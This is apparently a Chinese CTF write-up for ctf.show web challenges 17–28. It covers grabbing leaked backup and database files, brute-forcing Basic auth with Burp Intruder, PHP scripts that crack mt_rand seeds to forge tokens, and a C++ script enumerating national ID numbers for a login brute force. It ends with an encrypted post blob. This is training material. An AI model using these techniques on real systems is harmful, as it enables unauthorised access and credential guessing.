id="题目描述">题目描述</h3><p><strong>对于测试用的<code>探针</code>，使用完毕后要及时删除，可能会造成信息泄露</strong></p><h3 id="解题思路">解题思路</h3><p>考察PHP探针php探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡 流量、系统负载、服务器时间等信息。 url后缀名添加/tz.php 版本是雅黑PHP探针，然后查看phpinfo搜索flag</p><h2 id="17-web17">17.web17</h2><h3 id="题目描述">题目描述</h3><p><strong>备份的<code>sql文件</code>会泄露敏感信息</strong></p><h3 id="解题思路">解题思路</h3><p>根据提示备份的sql文件泄露敏感信息<br>常用访问backup.sql(或用dirsearch可以扫到)</p><h2 id="18-web18">18.web18</h2><h3 id="题目描述">题目描述</h3><p><strong>不要着急，休息，休息一会儿，玩101分给你flag</strong></p><h3 id="解题思路">解题思路</h3><p>是我喜欢(❤ ω ❤)的游戏题，玩到101分拿到flag，看这个速度和判定根本不可能<br>查看源代码发现是纯前端的JS脚本控制<br>找到flag的出现条件</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(score&gt;<span class="number">100</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">var</span> result=<span class="variable language_">window</span>.<span class="title function_">confirm</span>(<span class="string">&quot;\u4f60\u8d62\u4e86\uff0c\u53bb\u5e7a\u5e7a\u96f6\u70b9\u76ae\u7231\u5403\u76ae\u770b\u770b&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">var</span> result=<span class="variable language_">window</span>.<span class="title function_">confirm</span>(<span class="string">&quot;GAMEOVER\n是否从新开始&quot;</span>);</span><br></pre></td></tr></table></figure><p>控制台运行<br><code>alert('\u4f60\u8d62\u4e86\uff0c\u53bb\u5e7a\u5e7a\u96f6\u70b9\u76ae\u7231\u5403\u76ae\u770b\u770b')</code><br>弹出提示框到/101.php拿到flag</p><h2 id="19-web19">19.web19</h2><h3 id="题目描述">题目描述</h3><p><strong>密钥什么的，就不要放在前端了</strong></p><h3 id="解题思路">解题思路</h3><p>查看源代码看到注释掉的js脚本（绕过前端直接提交密码哈希大大简化步骤）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$flag=<span class="string">&quot;fakeflag&quot;</span></span><br><span class="line">    $u = $_POST[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    $p = $_POST[<span class="string">&#x27;pazzword&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_">isset</span>($u) &amp;&amp; <span class="title function_">isset</span>($p))&#123;</span><br><span class="line">        <span class="keyword">if</span>($u===<span class="string">&#x27;admin&#x27;</span> &amp;&amp; $p ===<span class="string">&#x27;a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04&#x27;</span>)&#123;</span><br><span class="line">            echo $flag;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure><p>hackbar以POST形式传入u和p以获得flag<br><code>username=admin&amp;pazzword=a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04</code></p><p><strong>未简化版本</strong><br>若隐藏以上JS脚本，我们已知AES加密函数，密文，密钥，偏移量，可解码获得明文<br><s>密码学会不了一点</s><br>直接使用<a href="http://tool.chacuo.net/cryptaes">解密网站</a><br>加密模式：CBC     填充：zeropadding  密钥：0000000372619038<br>偏移量：ilove36dverymuch  输出：hex  字符集：UTF-8<br>密文：a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04<br>解出密码：i_want_a_36d_girl 直接登录即可（楽）</p><h2 id="20-web20">20.web20</h2><h3 id="题目描述">题目描述</h3><p><strong>mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤</strong></p><h3 id="解题思路">解题思路</h3><p>打开靶机发现提示asp程序，access数据库<br>mdb文件是早期asp+access构架的数据库文件 直接查看url路径添加/db/db.mdb<br>下载文件通过txt打开或者通过EasyAccess.exe打开搜索flag<br>或使用diesearch扫描到/db目录，进一步扫描也可发现/db/db.mdb文件</p><hr><h1>爆破</h1><h2 id="21-web21">21.web21</h2><h3 id="题目描述">题目描述</h3><p><strong>爆破什么的，都是基操</strong></p><h3 id="解题思路">解题思路</h3><p>本题给出密码本，BP抓包发现采用basic认证，发送到Intruder准备爆破<br>先确定变量位置，发现采用了base64编码<br>设置payload，加载密码本，设置前缀（Prefix）为admin:<br>采用base64-encode<br>注意顺序并取消特殊符号的编码<br>开始爆破找到状态码为200的即为成功，发包得到flag</p><h2 id="22-web22">22.web22</h2><h3 id="题目描述">题目描述</h3><p><strong>域名也可以爆破的，试试爆破这个ctf.show的子域名</strong></p><h3 id="解题思路">解题思路</h3><p>原题中flag所在的子域名应该已经失效<br>主要理解搜集子域名的意义<br>推荐一个<a href="https://scan.javasec.cn/">子域名爆破网站</a></p><h2 id="23-web23">23.web23</h2><h3 id="题目描述">题目描述</h3><p><strong>还爆破？这么多代码，告辞！</strong></p><h3 id="解题思路">解题思路</h3><p>代码审计，直接编写PHP脚本得到token值，源码中php可以直接使用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">10000</span>;<span class="variable">$i</span>++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$token</span>=<span class="title function_ invoke__">md5</span>(<span class="variable">$i</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) &amp;&amp; <span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) ===<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>((<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>))+<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>))+<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))/<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">31</span>,<span class="number">1</span>)))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;$i= &#x27;</span>,<span class="variable">$i</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#$i= 422</span></span><br><span class="line"><span class="comment">#$i= 1202</span></span><br></pre></td></tr></table></figure><p>GET方式传入token得到flag</p><h2 id="24-web24">24.web24</h2><h3 id="题目描述">题目描述</h3><p><strong>爆个🔨</strong></p><h3 id="解题思路">解题思路</h3><p>代码审计，发现用PHP随机数生成函数且种子固定<br>因此生成的伪随机数固定<br>编写php脚本(注意token错误可能是因为php版本问题)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">372619038</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">#1155388967</span></span><br></pre></td></tr></table></figure><h2 id="25-web25">25.web25</h2><h3 id="题目描述">题目描述</h3><p><strong>爆个🔨，不爆了</strong></p><h3 id="解题思路">解题思路</h3><p>这题需要看懂逻辑(终于有个有意思的了)，先分析以下源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="title function_ invoke__">hexdec</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>), <span class="number">0</span>,<span class="number">8</span>)));</span><br><span class="line">    <span class="variable">$rand</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$r</span>)-<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line">    <span class="keyword">if</span>((!<span class="variable">$rand</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;token&#x27;</span>]==(<span class="title function_ invoke__">mt_rand</span>()+<span class="title function_ invoke__">mt_rand</span>()))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$rand</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>$rand = intval($r)-intval(mt_rand());</code>当传入r=0时，可输出生成第一个随机数的负值（因flag随机生成，随机数每次不同）<br>接下来我们要用生成的第一个随机数反推随机数种子<a href="https://www.openwall.com/php_mt_seed/php_mt_seed-4.0.tar.gz">随机数种子反推工具</a><br><img src="https://img1.imgtp.com/2023/07/18/39RWHP7H.png" alt="在kali上编译并运行工具"><br>得到随机数种子（不同php版本有差异）<br>接下来编写php脚本验证种子正确性并得到第二、三个随机数之和</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">0x04a34661</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;  &#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>()+<span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">#2085542740  2190553804</span></span><br></pre></td></tr></table></figure><p>搞定！payload:?r=2085542740 cookie:token=2190553804</p><h2 id="26-web26">26.web26</h2><h3 id="题目描述">题目描述</h3><p><strong>这个可以爆</strong></p><h3 id="解题思路">解题思路</h3><p>由于出题人底层代码错误，直接连接也可链接到数据库<br>抓包放包可获得flag<br>也可像web21一样爆破，不再赘述</p><h2 id="27-web27">27.web27</h2><h3 id="题目描述">题目描述</h3><p><strong>CTFshow菜鸡学院招生啦！</strong></p><h3 id="解题思路">解题思路</h3><p>该题为一个教务管理系统，但是并不知道学生的学号和密码<br>但下方给出了录取名单 身份证621022********5237中有八位被遮挡<br>思路清晰，要爆破可用的身份证<br>这里要会写身份证检验的脚本，能大大减少爆破的数据量</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">checkCard</span><span class="params">(<span class="type">int</span> ID[<span class="number">18</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> list[] = &#123; <span class="number">7</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">2</span> &#125;;</span><br><span class="line"><span class="type">int</span> src[] = &#123; <span class="number">1</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span> &#125;;</span><br><span class="line"><span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">17</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">sum += list[i] * ID[i];</span><br><span class="line">&#125;</span><br><span class="line">sum = sum % <span class="number">11</span>;</span><br><span class="line"><span class="keyword">if</span> (src[sum] == ID[<span class="number">17</span>]) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> id[<span class="number">18</span>] = &#123; <span class="number">6</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">7</span> &#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> y = <span class="number">1990</span>; y &lt; <span class="number">2024</span>; y++)</span><br><span class="line">&#123;</span><br><span class="line">id[<span class="number">6</span>] = y / <span class="number">1000</span>;</span><br><span class="line">id[<span class="number">7</span>] = y / <span class="number">100</span> % <span class="number">10</span>;</span><br><span class="line">id[<span class="number">8</span>] = y / <span class="number">10</span> % <span class="number">10</span>;</span><br><span class="line">id[<span class="number">9</span>] = y % <span class="number">10</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> m = <span class="number">1</span>; m &lt; <span class="number">13</span>; m++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (m &lt; <span class="number">10</span>)</span><br><span class="line">&#123;</span><br><span class="line">id[<span class="number">10</span>] = <span class="number">0</span>;</span><br><span class="line">id[<span class="number">11</span>] = m;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">id[<span class="number">10</span>] = <span class="number">1</span>;</span><br><span class="line">id[<span class="number">11</span>] = m % <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> d = <span class="number">1</span>; d &lt; <span class="number">31</span>; d++)</span><br><span class="line">&#123;</span><br><span class="line">id[<span class="number">12</span>] = d / <span class="number">10</span>;</span><br><span class="line">id[<span class="number">13</span>] = d % <span class="number">10</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">checkCard</span>(id))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">18</span>; i++)</span><br><span class="line">cout &lt;&lt; id[i];</span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可用数据大概有一千多条，抓包爆破找到反常长度的返回即可获得flag</p><h2 id="28-web28">28.web28</h2><h3 id="题目描述">题目描述</h3><p><strong>大海捞针</strong></p><h3 id="解题思路">解题思路</h3><p>进去发现毫无提示，真是大海捞针<br>不过既然原域名发生重定向到/0/1/2.txt，又属于爆破题（注意爆破时要将2.txt改为默认文件index.php）<br>可以想到BP抓包爆破域名<br>/0~100/0~100<br>爆破后在/72/10/index.php返回状态码200<br>拿到flag</p><hr>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 信息搜集 </tag>
            
            <tag> 爆破 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>更新日志&amp;md语法演示</title>
      <link href="/2023/07/09/demo/"/>
      <url>/2023/07/09/demo/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="cc9117bd8f9b7be5f96ce664a1a92d11cdde2906ad3194213f5ce4cd9f5e0eab">7221fb0495e4eb667446d07943e49fc3097ef7e0a661aa5a01bcae2365d453fd5e3a6f7cb6178ed5a0434257d48838c9a94a5ad1d75d4776b3317c52fa13d81a590d09f9c0f5be1ec3bab1113106434a16f8b611af8853b1624132a5445fa565ca21b781c49ff6bc450e4ab7e1bf599ec561d1f1b35c73d80dfe71d0a30fcbf81871a7e41961dfdcd637f3664ae0dcb76fd2686048163e65fede663d51aef943e3195d7ed74ba3e6a71492162a920aef997ea467aa38b4d583f4b54589852fae231d5cef0cb207ec3292b6cfd8cff84f319153b83fd7582aafb1d84604cbcb4d2e303238f81c37c0b4a01f6a560f2523e787928eb45f4c3592e298517648cec3fac22ab56fb879438bd101f35c3dbe4fb311816ff8d62cdf88771543ff7cd04bb16098f24e9216eb21b67c1dac136ccb249a4b0438fd1c314363066bf52b8617009859876a4f5f641becb915c2048820ac65264ec71dbacd9e0746495efd2238bf157ded2a37bb5020dbd8f8db8ddb13d89361b1b49aa2a672cd298ffd7bfe6467c7a75bad1454fed5d809996ac980785152ebf66cd88a03eda2d71229fb38ce523f58208c7991b7ece381b5faf135371014f5c091af96fa44f39d2eebe84a7f83e3597265568a3f8baff1cd0926d1e5a57a4a738da9e7a5e1159aba2b0b8a7d5f06549d8c744b107d7386d243b74f3808d3206e03f77639dfa23d211e2a866b456b4a7b16c6550259dfccfec8b3603c23c5e50acf04cc016865db7e591d4a05722e9a3e62ecc0d8eb751668f41a933feaaa302d8a07451d11e11eee69b6a648c4255ce62a28108e33e6a5b38f15c5d2db37c5722e7f52be2ba2d804aa0574525092db27cb9473b9d116988944d6ea4e44f103e25bd8fb5e5b6b1e5fedb4ae27188d4d04e190d3c3d8ca993452dafb0e74d3aa27e056c5693caf1aee1e84041ef6066ae1b83612dec709c99a7275f3b26736737fa994b6ac2230ecd07e770edc4ef0b9155c86de767c07be3ab7777f367105ffaada1b8d26315fe613922260f73ed11b0bf134b05fe713caf16fca5d994a47ede4d947950c708765313a818b138e9ce23d9ce94afbf5957773c81f797f9e1e349e6e549719d504646717ba25be608845a96672a46ac5d5b4374dc7660f35aa49b172ebc2b5e09b7801251c998049fa6631d8221de5d0c1426392ec4d28e5826e38b285e4270433f6620abf791a2b7843d4a16ab335b4e4cabf6b4e85b7c9c3a638625096e9757a227e9018f79cbf8cb42676ca876766c48e89265dda7f086c9e4fe5c6c659e6dd7891ce06153aa1cc60f6c393802372b858623fea61555cf56ee86a9b5d02ce71f8c09750cc783a734e8df504212ae04e6c4491dda568ec0602df1725e4ec2a5ada13fcfe6f041829594e95f0b220840f9acb40c39ae66df81617f3bc6622670a31e9b7bfd2afdf50dc52ec80498588a085d089336c3cd8dab6f8560132b2016ef11fa7a79fcd48953d2a51688761af0c7793a3ad6c353e4e09d2e6df435d88a4f6cc29a0b35c7c41bd16c0f285b1a7acd29751c6f04075f54b51babc9046b3f8f26aba6753e66449c3317397196ecf0010b556a5b40d147cc624949e69e407d9e20b6b1ea238d9656c8527e4fe3abeadcda1b4568974025f6fe303679cb9a7f0d751a5a42635395775dbf8841b4862dd13d136170abbfd45beb7612f616045b2c45cccd27c46a872e3285073c6f3f4c6d27ce423822e623ffb65f79797db232abd6dd5437dc38f693afb223038a0c82a039762ddca478c0114f2f7f25d4502c9cca22175031cea3e4f627d222d0c5ca32d08e0099ac90937c0d36b5f402765d3d31516704a56d3758112c561c192b07c262ae47e76782dc6e97fc91d76433103c4bed39f66be1d1163214982b972e2a3f08ae420954f9b43b201a0cb91fe90b0f16f62adf6b2c2b6db54c23f798ebc17e1fd4c1402c8298a847ce4e765fd36c96921fb91c606d7ec37c71482e1810f5e934ea193041bb14d2f7ce81f582852419e3833f050ffd4c1f707bf56b9e204a0bbfd4c3981024f162c7ab3f629e2a766785a333a2da0e5727ffcae6a613a399d8010bcabf04d20a9bfa84c64d111b4d896cc5acf594c08e0b8b5cad89403ba80d8858458224dbc708ddfec0a2d7321cdcbbe80cee96c6050ad417ee6f791a937ba9d4067e48a5c123ac4a90ef723e36373b6a2f4cbfc0bff220a3a4027c52bcbba4b73039b772ee781e7513a79bcb8500228910358f91e1cf15328d26e33c23d26ab79c53dfc1a746de329180682c79050be303ef610f70ff8b9656d82c146f4e7f8f3baca3ba5b480d905e2df1b1a94596d7076b6a9b0b7e70c1a83fb1c82743b87ed394308a5e1f8942b30b3d2472ad1f9585929ad31ae18a9f1990a21236a0f73c373b8102e2029721360276b69b47b3b9cead01fd0087b111b2f389915537cc13408e964ae781f23401aa39d39bb58eb49f772a207b38759a422639c44f94eacc5023a793749d9699d474036972cb695473ede0a8339da1c2b0c5aad93b937575ffa4091f3f79771788e3b2634a218d0bc42a76e3c0eb92ad0393408e7e69d3f675ff9653767f75449dd4e7a2d73a29a6256398b823a9a5328bf99c8f9a9ec00934d37f05f28309dc8dc6d28efd7fbfa3ecb45433c76c0d98a7f2e07af6fcd76630310b4f09b11e9d5a2aa3e3b627a12d4ebdf47fbc0ee03ad0e10d1f72ebb96236e3a5510080a50411dcb802329c9ab8c69b15e01c6d748f691cd56aeeb5e8f1e4017b1916d90790095e983c8cf586050b4f7b81ad625aebc9f2aedcf90a8b5e558ecba52b047347d146040d5f1e2dc62e072473b2cb09962e1aa30a10ddd614d98140398fcbc7caa2e42d3f8d87683e5c58b70a65363715bf4c9e1a914eb5362fa967dc89e37acdd36d1cfe3c5f4c654a32b5929b54cb660b1bf302fc2140f1cd36794a77c5f5b9737cbe7b54bfc13da6874abefa19a47fe6c1002442cbc418aee2c3bd06d7243d05aa29a0dc8d999e4066ca75e91e9fcefeb131294a4fc14189f55ed21a418e49f4d024c458198959cadaf4d2cbb0f1aca980ea45a61655d36ba971a35019cf42d6ff67846bfd6d3d2540b09de839a9d6e65653dbea293b4df1bb705a2c905343ece3e0dbe8c8c6fc9eef57a1b83c5973bf15f1e4a0fb384e2cf79f2e86bccd27464cfca814050c6e642596456f60ec61bc2d32f9d5b2226c437ec2e70ae57d9ff0b45a1376d8f7fb34603680120cfb3135d11bf44438121b3580c46cbd9f86e698f79cdd78a84bb1374e3879a5c2cb3e5ad66bfb286a76a7285d698bf60ed64dacaab3dbdea631f2f95cc0ad139e102777f2464a69537d97658b14e5a40f25a524f09174d611260aa4688a8315b9bc6275291c171927dce077336dc9d8ea4bd9cea9d2ff526f21fa6bebea02c7b24274851d7ce96c6a2d2552922538405392eae3f8e478e8bb0c51c9b7f73ede479a32218a8ac495570541cb771adbe9ae702732be68d73af6f07e99fb79555acfa40196cb4ee2cfe84ef0f05ee398177a50f01a3fad8209bc442215e4b93237964761a85064fa064f3132c55f172b6126e9600cdb019dc6fa749613502ba57ee02b8b281fdfb2a5da592d90196fced8946e095ea7053ca1c415f4dd791f87b54214d8d71ecf4cd12a6770ad301947f838305e735e6b892f6c52026473f2ba1f6d45ddb3fa180c78bd9eba4a878f3d5f0574963257a81935ba8707720aa32c68e8815bb96958fdb8e7f4abedf06483db2cab5501865e49af2635e77697c5391d0b03982d7b82ea5083e7d6e39b8ee58c363c3a6d388be88aa88e181880f07ed929dfaa27b4b69666a3f0c73882eeb7a0a11d48454ef8bf36f6c14ae1f37c7574f4d03250f1e5017f27a20d3875009ca82ee2197abffca6df6ac2088f398ca2f3862900e0a810239e45e3d10b5a5b6cf78c4f18d562f9c261cd826591205cd9161a33e21ae4ec68b9b99990c8aa2ac92e4e6a7419d1b4da9c4240454630cf56dbc3298f9432800ff05c3acf4b0324864be8bc777509a72e01bd969903584281a6da194f886766d7ad98260dc066b910f11f9c15239ee7dc562a3b4ecafd2299d66f7d3a1303f9aebfe28befd548fd961b71e88c0fe2c71c410a67c2c515a7b92e3ad3998b5d732eed44a15b8e81cd22ca9ae41b71e22b5e7d1f048d44ca3210b4d051fa683bb3739381f5ef62453eab16bbe3fb5ae8be0ef5bc80195ca9a7ed56982f3f056febad2a166c3e219f0e36bbc3c06335e3a83a7a72ae1e2df5ce84280178f23a4156a99406ade54e8bae00111efe3e329859bb976f0da4049a9f5d839380727c064f3a0e50380056af19dbe41ee4b643a80116af1ac0c55582b8b03fbf4eb63ea8fc2a7cc43792a1080640fa836c3123d2b9710f77b51ef04359a19ff5336840894a65297b1cef3dc45e42c931764ea6eb01f1afb10a62e64bd81aa71ff8fed9c48ea1dbe5c9b973864d91c6af229a6c724b67898fd5c9958b59c18ff9805d883411d3226c122cc0f6e159091d8789c29cf9cda7b0abbfdfc8f87ff30d92ce00e02674c9b45ebdeb0fe272527ec41d1897c8afeebe965cffa035cc53d0acfed89011d1eb52d22bb737da3a517f941ef1076124a997a2ef6a1be738be755321daba3f67ad6cf7822b159880b0f82687b637f3c10e0b8f5cdce5a3346e1d3abcd78e1ebb869b8f6ca2ca3bb5b389692524c25cc0287af3c2070065dbb2bf0ae6960b4563fb0b9e785f22f0addd2f864ae6a6d92462eea12415db1ef9d3e581c66876c99569ee8138c078e063989f333edc8c690005a904af5ad7714308dfdac3f2af24c93d421c51bb39032f9ff5b5de0668445e6aa375e54c3fb477431150511121ef6e8e2b89d2652e901c9886941ae288c4603e355ade9418b16e9e14fc1fd55a08d880dcdaddce804a3842d3324c380e2046454bdad513401af3c3990c938199413e13b0c719204c886ffb13db4837622b28b60c0cde6a6a239a7cdad6cbd38899dae955a69d9f5247d87ed8bb6e923a5e9a7a20fc054fc98be882118c4970a90a061e2766d504745c2c81dce972d858b05389eba22ac9635d8a67a1ab9027c058b6bc7c6ed4c42563200dc86f86f54c04565defba082c7e64a4866ec7453057abc346495ffb4518d5b995331dc58a27dd7859a49a90b3d7cafb099d9e5f7bc72457eac6a6efa68c341f45c1cf8600c440394583d4985f8ec7b57d3bd7fe25f1d341cc1f4fe60846350b6613ea622af1b0a22e0582cad76b400526f4c7482fb29c996071fadcef4972f1ff2d9c836e0e5938aaab2e285026f9ed3302f471e9163e87a58e602c69dd50eddfac596430ca9d9d38296cb5883649393d1a7e5cd38f504cb41191f24e5c471cdac5afd30e78df7204fba70e19648e3559217bfa4b89d70539fbe5f7bc99f1bc6104d5591c8369e594aba1516a86947384bbf92ce22d67b1bd2bfacd9bc4bb6b931b6dab6b27dac8c68ad1ec11885d3712f34098bef234808f36020fe1b3bca5c1caf9eb058da82bc57150301c938aa63e2157b37539ac18eef56718f5a16366e2186ccfaff3d2fac74a257245770fe8f99ff5d91ef6f697e9802d0fc00a75135f20cbf42084e5ae587cb7e58490844d5900b4339c0f213df8dea80decaa50b186f6b0dfa217441325e3eea4d578f96b559c23f92b7d8b47a03f38c1c88d1cc9f2e27